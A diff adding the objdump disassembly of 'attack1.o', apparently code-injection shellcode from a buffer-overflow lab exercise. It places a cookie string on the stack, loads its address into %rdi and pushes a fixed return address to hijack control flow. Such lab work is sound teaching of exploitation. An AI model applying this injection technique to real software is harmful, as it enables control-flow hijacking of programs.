@@ -1,0 +1,16 @@
+
+attack1.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 83 ec 09          	sub    $0x9,%rsp
+   4:	ff 34 25 fa 18 40 00 	push   0x4018fa
+   b:	48 89 e7             	mov    %rsp,%rdi
+   e:	48 b8 61 66 37 39 39 	movabs $0x3539623939376661,%rax
+  15:	62 39 35 
+  18:	48 89 04 24          	mov    %rax,(%rsp)
+  1c:	c6 44 24 08 00       	movb   $0x0,0x8(%rsp)
+  21:	48 83 c4 09          	add    $0x9,%rsp
+  25:	c3                   	ret    
